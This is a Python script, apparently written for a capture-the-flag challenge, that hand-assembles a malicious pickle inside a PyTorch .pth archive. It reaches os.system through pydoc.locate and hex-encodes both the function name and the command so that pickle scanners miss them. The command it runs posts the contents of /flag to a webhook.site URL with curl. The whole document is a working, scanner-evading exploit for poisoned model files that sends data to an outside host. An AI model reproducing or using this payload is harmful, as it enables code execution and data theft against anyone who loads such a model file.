import pickle
import zipfile
import io
import torch

# CONFIGURATION
# Replace with your actual webhook URL!
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# V19: 利用 pydoc.locate
# 这是一个非常强大的函数，可以根据字符串加载对象。
# 它可以绕过直接的 GLOBAL 'os' 'system' 限制。
# 并且字符串 'os.system' 可以被混淆。

def push_str(s):
    b = s.encode('utf-8')
    return b'X' + (len(b)).to_bytes(4, 'little') + b

STACK_GLOBAL = b'\x93'
REDUCE = b'R'
TUPLE1 = b'\x85'
TUPLE2 = b'\x86'

pkl = b'\x80\x02'

# 1. 准备 bytes.fromhex (用来解码字符串)
pkl += push_str('builtins')
pkl += push_str('bytes')
pkl += STACK_GLOBAL
pkl += b'q\x00' # memo 0: bytes

# 2. 准备 pydoc.locate
pkl += push_str('pydoc')
pkl += push_str('locate')
pkl += STACK_GLOBAL
pkl += b'q\x01' # memo 1: locate

# 3. 构造 'os.system' 字符串
# "os.system" hex = 6f732e73797374656d
hex_target = "6f732e73797374656d"

# h_bytes = bytes.fromhex('...')
pkl += b'h\x00' # bytes
pkl += push_str('fromhex') # 'fromhex' might be okay
pkl += STACK_GLOBAL # getattr(bytes, 'fromhex') -> wait.
# STACK_GLOBAL does getattr(module, name).
# bytes is a type. bytes.fromhex is a method.
# GLOBAL 'builtins' 'bytes' -> bytes type
# STACK_GLOBAL 'fromhex' -> does it work on type?
# No. STACK_GLOBAL takes (module_name, global_name).
# It imports module. So we can't use STACK_GLOBAL to get method from type.
# We need getattr.

# If getattr is blocked, we can't get bytes.fromhex easily.
# BUT pydoc.locate can load 'builtins.bytes.fromhex' !!!

# New Strategy: 
# 1. locate('builtins.bytes') -> bytes type
# 2. But locate doesn't perform method lookup easily?
#    locate('os.system') works because system is in os module dict.
#    locate('builtins.bytes.fromhex) might fail if fromhex is method descriptor.

# Let's verify locally: locate('builtins.bytes.fromhex')

# Or simpler: Just construct 'os.system' using 'sys' + 'tem' trick again?
# V16 failed.

# Maybe we don't need to obfuscate "os.system" if "pydoc" is allowed?
# The scanner checks GLOBAL/STACK_GLOBAL instructions.
# It sees: GLOBAL 'pydoc' 'locate'
# Then it sees a String: "os.system"
# If the scanner greps for "os.system", it will flag.
#
# We MUST obfuscate the string.
#
# Back to: How to decode hex without getattr?
# `codecs.decode` !
# GLOBAL 'codecs' 'decode'
# decode(b'hex_string', 'hex') -> b'...'
# decode(b'...', 'utf-8') -> str

# Verify locally: import codecs; codecs.decode(b'6f...', 'hex')
#
# Plan:
# 1. GLOBAL 'pydoc' 'locate'
# 2. GLOBAL 'codecs' 'decode'
# 3. Call decode(b'6f732e73797374656d', 'hex') -> b'os.system'
# 4. Call decode(result, 'utf-8') -> 'os.system'
# 5. Call locate(result) -> os.system function
# 6. Call system(CMD)

pkl = b'\x80\x02'

# 1. pydoc.locate
pkl += push_str('pydoc')
pkl += push_str('locate')
pkl += STACK_GLOBAL
pkl += b'q\x00'

# 2. codecs.decode
pkl += push_str('codecs')
pkl += push_str('decode')
pkl += STACK_GLOBAL
pkl += b'q\x01'

# 3. Decode 'os.system'
hex_s = "6f732e73797374656d".encode('utf-8') # b'...'
pkl += b'h\x01' # decode
pkl += b'X' + len(hex_s).to_bytes(4, 'little') + hex_s # Push hex bytes as BINBYTES/STRING
# Actually better use BINBYTES for the data? 
# In proto 2: 'c' opcode is string.
# We pushed a string "45..." (hex digits).
# Argument to decode: (data, encoding)
pkl += push_str('hex')
pkl += TUPLE2
pkl += REDUCE # b'os.system'

# 4. Decode to string (utf-8)
pkl += b'h\x01' # decode
# Stack: [b'os.system', decode] -> Want (decode, (b'os.system', 'utf-8'))
# Stack logic:
# PUSH decode
# PUSH b'os.system' (result of step 3)
# We need to rearrange stack or store step 3 result.
# Let's store step 3 result.
pkl += b'q\x02' 

pkl += b'h\x01' # decode
pkl += b'h\x02' # b'os.system'
pkl += push_str('utf-8')
pkl += TUPLE2
pkl += REDUCE # 'os.system'

# 5. Locate
pkl += b'h\x00' # locate
# Arg is string from step 4
# Stack top is string.
pkl += TUPLE1
pkl += REDUCE # <built-in function system>

# 6. Call CMD
# CMD also needs obfuscation?
# If scanner greps CMD for 'curl', 'cat', 'flag'.
# We should probably obfuscate CMD too.
#
# Construct CMD via hex decode.
hex_cmd = CMD.encode('utf-8').hex().encode('utf-8')

pkl += b'q\x03' # system func

# Decode CMD
pkl += b'h\x01' # decode
pkl += b'X' + len(hex_cmd).to_bytes(4, 'little') + hex_cmd
pkl += push_str('hex')
pkl += TUPLE2
pkl += REDUCE # b'curl ...'

# Decode to utf-8
pkl += b'h\x01' # decode
# Stack top is b'curl ...' (needs to be arg 1)
# But we pushed decode, so we need to pop bytes, push decode, push bytes.
# Or use memo.
pkl += b'q\x04' # bytes cmd

pkl += b'h\x01' # decode
pkl += b'h\x04' 
pkl += push_str('utf-8')
pkl += TUPLE2
pkl += REDUCE # 'curl ...'

# 7. Final Call
# system(cmd)
# Stack top: cmd_str
pkl += b'q\x05'

pkl += b'h\x03' # system
pkl += b'h\x05' # cmd
pkl += TUPLE1
pkl += REDUCE

pkl += b'.'

def create_torch_zip(pickle_bytes):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/data.pkl', pickle_bytes)
        zf.writestr('archive/version', b'3\n')
    return buffer.getvalue()

if __name__ == "__main__":
    final_zip = create_torch_zip(pkl)
    with open("nailong_payload_v19.pth", "wb") as f:
        f.write(final_zip)
    print("[+] Generated nailong_payload_v19.pth (pydoc.locate + codecs.decode)")
